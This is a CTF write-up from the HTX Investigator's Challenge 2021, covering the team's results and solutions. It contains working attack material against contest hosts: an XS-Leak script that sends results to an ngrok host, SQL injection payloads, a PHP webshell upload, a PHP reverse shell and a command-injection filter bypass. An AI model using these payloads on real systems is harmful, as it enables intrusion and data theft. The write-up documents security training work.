# HTX Investigator's Challenge 2021

## Introduction

The HTX Investigator's Challenge is a Singaporean CTF competition hosted by the Home Team Science and Technology Agency (HTX).

The event ran for 12 hours from 8am to 8pm on 20 December 2021, and included various cybersecurity challenges.

## Results

### TL;DR

My team, Social Engineering Experts, **topped the scoreboard**, with a total of 43,380 points.

![](../.gitbook/assets/Scoreboard\_Home.png)

### The Long Story

We didn't qualify for the prizes due to eligibility criteria. **The official champions for the HTXIC 2021 are the good folks from T0X1C V4P0R.**

Since this has already sent some shockwaves in the local CTF community, and will inevitably lead to more questions in the next few days, I thought I'd spend some time writing about the situation and addressing some anticipated questions.

The eligibility criteria for the HTXIC challenge are as follows.

![](<../.gitbook/assets/Screenshot 2021-12-24 at 1.54.24 PM.png>)

The team comprised of 5 members currently serving our National Service (NS) with the army, and all of us were Junior College (JC) graduates.

We were not 100% sure whether Institutes of Higher Learning included Junior Colleges, and seeing our friends who are also currently serving NS - but having graduated from polytechnics - signing up, we were eager to participate as well.

We decided to put in our registration regardless, declaring our JCs and year of graduation (2019) in the registration form, with the assumption that the shortlisting process would take the eligibility criteria into consideration.

Post-CTF, we found out that we were ineligible for the challenge. However, the organizers have allowed us to claim that we emerged **"top of the scoreboard"**.

![](<../.gitbook/assets/Screenshot 2021-12-27 at 10.54.17 AM.png>)

### Personal Thoughts

Overall, we did have fun with HTXIC. The people we met at HTX have been nothing but nice to us and were receptive to our feedback.

We mentioned that we would love to see more local CTFs that cater to NSFs like us, and hope that future CTFs could consider this.

## Writeups

I've added brief writeups for some challenges.

* [SecureBank XSS Search](broken-reference)
* [Chained Web Challenges (SQLi, RCE)](htx-investigators-challenge-2021.md#chained-web-challenges-sqli-rce)
* [Revo Web App](htx-investigators-challenge-2021.md#revo-web-app)
* [Web 101](htx-investigators-challenge-2021.md#web-101)
* [Find the Malicious Attacks by Revo Force](htx-investigators-challenge-2021.md#find-the-malicious-attacks-by-revo-force)
* [Identifying the High-Risk Individuals](htx-investigators-challenge-2021.md#identifying-high-risk-individuals)
* [c0deD ME5sages](htx-investigators-challenge-2021.md#c0ded-me5sages)

### SecureBank XSS Search

This challenge required us to find out the account balance of the admin.

Looking carefully at the responses received from the web application, we would realise that the `/checkbalance` endpoint is vulnerable to a class of vulnerabilities known as [XS Leaks](https://xsleaks.dev).

If the queried amount is more than the actual balance in the user's account, the user is redirected. Otherwise, no redirection occurs. It would be possible to get the length of the window's history to check whether this redirection is occurred, allowing us to perform an "XS Search" on the user's account balance.

To obey the Same Origin Policy (SOP), we would need to do the following:

1. From the exploit server, open `http://10.8.201.87:5000/checkbalance?amount=${num}` as a new window.
2. Wait for the site to load. Depending on the balance, the window may be redirected to `/`.
3. Change the window's location back to the exploit server, so that both the original and new windows are of the same origin
4. We can now check the window's `history.length` attribute to determine if a redirect occurred in step 2.

After some trial and error, here's my final script.

```markup
<html>
    <body>
        <script>

            const sleep = (ms) => {
                return new Promise(resolve => setTimeout(resolve, ms));
            }

            const tryNumber = async (num) => {

                let opened = window.open(`http://10.8.201.87:5000/checkbalance?amount=${num}`);
                await sleep(2000);
                opened.location = "http://24cf-115-66-128-224.ngrok.io/nothing.txt";
                await sleep(2000);
                console.log(opened.history.length)
                if (opened.history.length === 3) {
                    return [false, num];
                }
                else {
                    return [true, num];
                }
            }

            (async () => {
                for (let i = 97280; i <= 97290; i+=1) {
                    tryNumber(i).then(res => {
                        let [success, guess] = res;
                        console.log(guess, success);
                        if (success === true) {fetch("http://24cf-115-66-128-224.ngrok.io/" + `${guess}`)}
                    })
                }
            })();
        </script>
    </body>
</html>
```

On line 25, I started with larger intervals, then slowly narrowed down the exact value by decreasing the interval range.

### Chained Web Challenges (SQLi, RCE)

The Tenant and Management login pages were both vulnerable to SQL injection.

Using SQLMap, we could dump the users table in the database.

```
+-----+----------------+---------+------------+----------------+
| id  | name           | role    | password   | username       |
+-----+----------------+---------+------------+----------------+
| 100 | theadmin       | admin   | madeira101 | theadmin       |
| 200 | ahhong         | manager | manager101 | MANAGER        |
| 300 | HTX{Admin_101} | vendor  | vendor101  | HTX{Admin_101} |
+-----+----------------+---------+------------+----------------+
```

Taking a closer look at the users, we could see that each one has a different role. Logging in as different users allows us to perform various actions. As the vendor user, we have the ability to add to the food listing.

This allows us to upload an image, and the validation for this is flawed. It seemed to be checking for the existence of the `.jpg` extension, but using `.jpg.php` passes this check and allows us to upload a PHP webshell that we can access at `http://10.8.201.87/HTXIC/vendor/images/`.

```http
POST /HTXIC/vendor/doaddFoods.php HTTP/1.1
Host: 10.8.201.87
Content-Length: 504
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTeHcGQrvcC6GYyC2
Cookie: PHPSESSID=6co2q20vqh580a4uae4gpq3grl
Connection: close

------WebKitFormBoundaryTeHcGQrvcC6GYyC2
Content-Disposition: form-data; name="name"


------WebKitFormBoundaryTeHcGQrvcC6GYyC2
Content-Disposition: form-data; name="price"


------WebKitFormBoundaryTeHcGQrvcC6GYyC2
Content-Disposition: form-data; name="description"


------WebKitFormBoundaryTeHcGQrvcC6GYyC2
Content-Disposition: form-data; name="image"; filename="pwned.jpg.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------WebKitFormBoundaryTeHcGQrvcC6GYyC2--
```

Using a PHP reverse shell payload, we were able to get a bash shell into the system.

```php
$sock=fsockopen("LHOST", LPORT);
$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
```

The `systemctl` binary had the SUID bit set, allowing us to escalate to root privileges by [creating a service](https://gtfobins.github.io/gtfobins/systemctl/).

### Revo Web App

Performing a directory scan reveals that there is a `/cmd.php` endpoint.

This seems to allow us to perform command injection, but there appears to be a blacklist filter. Fortunately, the `cat cmd.php` command works, allowing us to view the blacklist.

```php
<?php
  function test_input($data) {
    $str1 = "%44";
    $data2 = append_string ($str1, $data);
    return $data2;
  }
  
  function display()
  {
    $bl = array("/",";","@","\","\/\/");
    $input = $_POST["cmd"];
    $input = str_replace($bl, "", $input);
    $bl2 = array("curl","shutdown","init","systemctl","ps","ls","etc");
    $input = str_replace($bl2, "", $input);
    $output = shell_exec($input);
    echo $output;
  }
  if(isset($_POST['submit']))
  {
    display();
  } 
 ?>
```

To overcome the blacklist, we used a base64-encoded payload, which is then decoded by Python on the server.

```python
import base64

PAYLOAD = b"cat /home/bobby/flag.txt"

encoded = base64.b64encode(PAYLOAD)
print(encoded)

command = "python3 -c '__import__(\"os\").system((__import__(\"base64\").b64decode(\"" + encoded.decode() + "\")))'"
print(command)
```

### Web 101

There is a blacklist filter for `#` and `=`. Using `test' or 1-- -` gives us account credentials, but logging in with these does not give us the flag.

We could use a `UNION` based injection to dump the database and get the flag.

`username=test' or 1 UNION SELECT *, null from flag-- -&password=test' or 1 UNION SELECT *, null from flag-- -`

### Find the Malicious Attacks by Revo Force

We were given CSV files containing network traffic data, as well as a shapefile containing cameras in Singapore. We are tasked to find where most of the attacks are originating from, and the number of cameras within a 1.3km radius.

First, we obtain the most common `src_ip`, and find its corresponding latitude and longitude.

```python
import os, csv

SRC_IP_COL = 9
LABEL_COL = 14

files = [x for x in os.listdir() if x.endswith('.csv')]
results = {}

for file in files:
    with open(file, newline='') as csvfile:
        reader = csv.reader(csvfile, delimiter=',', quotechar='"')
        for row in reader:
            src_ip, label = row[SRC_IP_COL], row[LABEL_COL]
            # print(src_ip, label)

            if label == 'malicious':
                print(file)
                if src_ip in results:
                    results[src_ip] += 1
                else:
                    results[src_ip] = 1

print(results)
print(max(results.items(), key=lambda x: x[1]))
```

After, we can parse the shapefile using geopandas, and use the [haversine formula](https://en.wikipedia.org/wiki/Haversine\_formula) to determine the  great-circle distance between each camera and the `src_ip` location based on the latitude and longitudes.

```python
import geopandas as gpd
from math import radians, cos, sin, asin, sqrt


def haversine(lon1, lat1, lon2, lat2):
    """
    Calculate the great circle distance between two points 
    on the earth (specified in decimal degrees)
    """
    # convert decimal degrees to radians 
    lon1, lat1, lon2, lat2 = map(radians, [lon1, lat1, lon2, lat2])

    # haversine formula 
    dlon = lon2 - lon1 
    dlat = lat2 - lat1 
    a = sin(dlat/2)**2 + cos(lat1) * cos(lat2) * sin(dlon/2)**2
    c = 2 * asin(sqrt(a)) 
    r = 6371 # Radius of earth in kilometers. Use 3956 for miles
    return c * r


LAT = 1.327187
LONG = 103.946316
RADIUS = 1.3

shapefile = gpd.read_file("SPF_DTRLS.shp")
print(shapefile)

count = 0
for row in shapefile.itertuples():
    lat2, long2 = row.LATITUDE, row.LONGITUDE
    a = haversine(LONG, LAT, long2, lat2)

    print('Distance (km) : ', a)
    if a <= RADIUS:
        count += 1

print(count)
```

### Identifying High-Risk Individuals

> You are given a dataset consisting the basic information of a list of individuals (refer to DATABASE\_FINAL). Some of these individuals have been identified to participate in terrorism related activities.
>
> Using the dataset, fit a model identifying FINAL\_OUTCOME =1 using all the variables (refer to variable list). Using the fitted model, apply it on the list of Grand Prix participants to screen out the top **5** individuals who are likely to participate in terrorism related activities based on the highest probabilities score (refer to GRAND\_PRIX\_DATA).

I initially tried to train my own model from scratch, but I realised that the fitted model coefficients were already given to us. (what was the point of the training data then?)

![](<../.gitbook/assets/Screenshot 2021-12-24 at 5.50.33 PM.png>)

We could thus simply create a simple linear regression model:

$$
y=\beta_0+\beta_1X_1+\beta_2X_2+...+\beta_nX_n
$$

Prepare for some ugly hardcoding...

```python
INTERCEPT = 2.4172534

def predict(row):
    score = INTERCEPT
    score += -0.0520673 * row.AGE
    score += -0.0005561 * row.DISTANCE_FROM_CENTRAL
    
    if row.HAIR_COLOUR == 1:
        score += -1.02074
    elif row.HAIR_COLOUR == 2:
        score += -1.4958285
    elif row.HAIR_COLOUR == 3:
        score += -0.928573
    elif row.HAIR_COLOUR == 4:
        score += -1.0712868
    elif row.HAIR_COLOUR == 5:
        score += -1.4369646
    elif row.HAIR_COLOUR == 6:
        score += -0.9730892
    
    if row.LEFT_HANDED == 1:
        score += -1.1364604
    
    if row.BIRTH_MONTH == 1:
        score += 0.3812858
    elif row.BIRTH_MONTH == 2:
        score += 0.4879133
    elif row.BIRTH_MONTH  == 3:
        score += -1.0803552
    elif row.BIRTH_MONTH == 4:
        score += -1.0529952
    elif row.BIRTH_MONTH == 5:
        score += -0.5742308
    
    if row.MARITAL == 1:
        score += -0.9297885
    elif row.MARITAL == 2:
        score += -0.2871768
        
    if row.DATABASE == 1:
        score += 1.6900339
        
    return score
```

What's curious though, was that the numerical variables weren't normalized. I initially normalized both the numerical variables, but only after much trial and error did I arrive at the "correct" model.

```python
xl_file = pd.ExcelFile("/kaggle/input/htx-database/GRAND_PRIX_DATA_FINAL_Revised.xlsx")
test = xl_file.parse("Sheet 1")

results = []
for row in test.itertuples():
    results.append((predict(row), row.SERIAL_NO))
    
print(sorted(results, key=lambda x: x[0], reverse=True)[:5])
```

### c0deD ME5sages

We are given the string:

`%109y69&o1#01U11_6(v32%E1,&01^b88E1@05e-1$1!6n32\T1#16!R10%4i&114!c69.K_1!01~e*@d`

Extracting only alphabetical characters yields `yoUvEbEenTRicKed`. However, between these letters are numbers that represent ASCII codes.

```python
import string

encoded = "%10*9y69&o1#01U11_6(v32%E1,&01^b88E1@05e-1$1!6n32\T1#16!R10*%4i&114!c69.K_1!01~e*@d"

result = ''
curr_num = ''
for char in encoded:
    if char in string.digits:
        curr_num += char
    
    elif char in string.ascii_letters:
        if curr_num:
            result += chr(int(curr_num))
            curr_num = ''

    print(result)
```

The decoded message is `mEet eXit thrEe`.
